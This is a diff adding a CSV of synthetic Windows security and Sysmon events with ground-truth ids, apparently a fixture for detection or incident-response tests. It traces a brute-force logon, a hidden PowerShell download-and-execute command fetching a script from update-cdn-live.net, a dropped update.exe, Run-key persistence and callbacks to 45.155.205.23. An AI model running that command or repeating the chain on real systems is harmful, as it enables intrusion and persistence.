@@ -1,0 +1,15 @@
+gt_id,timestamp,event_time,computer,account_name,src_ip,dst_ip,action,logon_type,source,privilege,Computer,User,Image,ParentImage,CommandLine,ProcessId,ParentProcessId,EventID,QueryName,TargetFilename,DestinationIp,DestinationPort,Protocol,Details
+E1,2026-09-26T23:25:39.000Z,2026-09-26T23:25:39.000Z,win-02.corp.local,administrator,45.155.205.23,10.0.0.22,failed_logon,3,windows-security,,,,,,,,,,,,,,,
+E2,2026-09-26T23:25:47.000Z,2026-09-26T23:25:47.000Z,win-02.corp.local,administrator,45.155.205.23,10.0.0.22,failed_logon,3,windows-security,,,,,,,,,,,,,,,
+E3,2026-09-26T23:25:55.000Z,2026-09-26T23:25:55.000Z,win-02.corp.local,administrator,45.155.205.23,10.0.0.22,failed_logon,3,windows-security,,,,,,,,,,,,,,,
+E4,2026-09-26T23:26:03.000Z,2026-09-26T23:26:03.000Z,win-02.corp.local,administrator,45.155.205.23,10.0.0.22,failed_logon,3,windows-security,,,,,,,,,,,,,,,
+E5,2026-09-26T23:26:11.000Z,2026-09-26T23:26:11.000Z,win-02.corp.local,administrator,45.155.205.23,10.0.0.22,failed_logon,3,windows-security,,,,,,,,,,,,,,,
+E6,2026-09-26T23:26:21.000Z,2026-09-26T23:26:21.000Z,win-02.corp.local,administrator,45.155.205.23,,successful_logon,3,windows-security,,,,,,,,,,,,,,,
+E7,2026-09-26T23:26:24.000Z,2026-09-26T23:26:24.000Z,win-02.corp.local,administrator,45.155.205.23,,special_privileges,,windows-security,SeDebugPrivilege,,,,,,,,,,,,,,
+E8,2026-09-26T23:26:29.000Z,2026-09-26T23:26:29.000Z,,,,,,,sysmon,,win-02.corp.local,administrator,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\explorer.exe,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://update-cdn-live.net/load.ps1')""",3120,2244,1,,,,,,
+E9,2026-09-26T23:26:33.000Z,,,,,,,,sysmon,,win-02.corp.local,administrator,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,3120,,22,update-cdn-live.net,,,,,
+E10,2026-09-26T23:26:36.000Z,,,,,,,,sysmon,,win-02.corp.local,administrator,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,3120,,11,,C:\Users\Administrator\AppData\Local\Temp\update.exe,,,,
+E11,2026-09-26T23:26:38.000Z,,,,,,,,sysmon,,win-02.corp.local,administrator,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,3120,,3,,,45.155.205.23,443,tcp,
+E12,2026-09-26T23:26:42.000Z,2026-09-26T23:26:42.000Z,,,,,,,sysmon,,win-02.corp.local,administrator,C:\Users\Administrator\AppData\Local\Temp\update.exe,C:\Windows\explorer.exe,"""C:\Users\Administrator\AppData\Local\Temp\update.exe"" --minimized",4010,2244,1,,,,,,
+E13,2026-09-26T23:26:46.000Z,,,,,,,,sysmon,,win-02.corp.local,administrator,C:\Users\Administrator\AppData\Local\Temp\update.exe,,,4010,,13,,HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate,,,,C:\Users\Administrator\AppData\Local\Temp\update.exe
+E14,2026-09-26T23:26:51.000Z,,,,,,,,sysmon,,win-02.corp.local,administrator,C:\Users\Administrator\AppData\Local\Temp\update.exe,,,4010,,3,,,45.155.205.23,8443,tcp,
